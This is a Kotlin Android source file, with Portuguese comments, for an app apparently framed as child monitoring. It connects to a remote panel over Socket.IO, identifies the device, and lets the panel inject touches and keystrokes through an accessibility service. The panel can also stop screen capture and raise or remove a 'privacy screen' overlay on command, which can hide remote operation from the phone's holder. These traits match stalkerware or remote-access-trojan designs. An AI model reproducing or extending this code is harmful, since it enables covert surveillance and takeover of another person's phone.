package com.example.acessomaterno

import android.os.Build
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

object SocketManager {
    private const val TAG = "SocketManager"

    // Painel FastAPI (mesmo domínio do /conectar-filho). É para onde os frames
    // de tela (enviar_tela) são transmitidos via Socket.IO.
    var serverUrl: String = BuildConfig.PANEL_URL

    var socket: Socket? = null
        private set

    fun connect(url: String = serverUrl) {
        // GARANTE UM ÚNICO SOCKET para todo o app. Antes, chamar connect() de dois
        // lugares (MainActivity + AccessibilityService) criava 2 sockets: o ouvinte
        // de cliques ficava num e o servidor mandava no outro -> clique não injetava.
        val existente = socket
        if (existente != null) {
            if (!existente.connected()) existente.connect()
            return
        }
        try {
            serverUrl = url
            socket = IO.socket(serverUrl).apply {
                on(Socket.EVENT_CONNECT) {
                    Log.d(TAG, "Socket.io Conectado com sucesso!")
                    // Identifica este dispositivo pelo NOME (mesmo usado no /conectar-filho).
                    emit("identificar", "${Build.MANUFACTURER}-${Build.MODEL}")
                }
                on(Socket.EVENT_DISCONNECT) {
                    Log.d(TAG, "Socket.io Desconectado")
                }
                on(Socket.EVENT_CONNECT_ERROR) { args ->
                    Log.e(TAG, "Erro de Conexão Socket.io: ${args.joinToString()}")
                }

                // ----------------------------------------------------------------
                // OUVINTES DE CONTROLE pendurados AQUI, no socket vivo, no momento
                // da criação. Antes ficavam dentro de MyAccessibilityService.onServiceConnected
                // (roda 1x só) e grudavam num socket que podia já estar morto após
                // reconexão -> clique/teclado chegavam mas NINGUÉM executava.
                // Agora despachamos para MyAccessibilityService.instance dinamicamente.
                // ----------------------------------------------------------------
                on("receber_movimento") { args ->
                    val json = parseJson(args)
                    if (json != null) {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[ACES] IGNORADO: servico de acessibilidade NAO esta ativo (movimento)")
                        } else {
                            svc.onRemoteMovimento(json)
                        }
                    }
                }
                on("receber_tecla") { args ->
                    val json = parseJson(args)
                    if (json != null) {
                        val svc = MyAccessibilityService.instance
                        if (svc == null) {
                            emitLog("[ACES] IGNORADO: servico de acessibilidade NAO esta ativo (tecla)")
                        } else {
                            svc.onRemoteTecla(json)
                        }
                    }
                }
                on("desligar") {
                    MyAccessibilityService.instance?.pararCaptura()
                }
                on("tela_privacidade") { args ->
                    val svc = MyAccessibilityService.instance
                    if (svc == null) {
                        emitLog("[ACES] IGNORADO: acessibilidade off (tela_privacidade)")
                    } else {
                        val acao = parseJson(args)?.optString("acao", "mostrar") ?: "mostrar"
                        if (acao == "ocultar") svc.removerTelaPrivacidadeRemoto()
                        else svc.solicitarTelaPrivacidade()
                    }
                }
            }
            socket?.connect()
        } catch (e: URISyntaxException) {
            Log.e(TAG, "URI inválida para Socket.io: ${e.message}")
        }
    }

    /** Aceita o payload como JSONObject ou String JSON. */
    private fun parseJson(args: Array<out Any>): JSONObject? {
        if (args.isEmpty()) return null
        return try {
            when (val arg = args[0]) {
                is JSONObject -> arg
                is String -> JSONObject(arg)
                else -> null
            }
        } catch (e: Exception) {
            Log.e(TAG, "JSON inválido: ${e.message}")
            null
        }
    }

    /** Log de diagnóstico que aparece no console do painel. */
    private fun emitLog(msg: String) {
        try { socket?.emit("log_dispositivo", msg) } catch (_: Exception) {}
    }

    fun disconnect() {
        socket?.disconnect()
        socket = null
    }
}
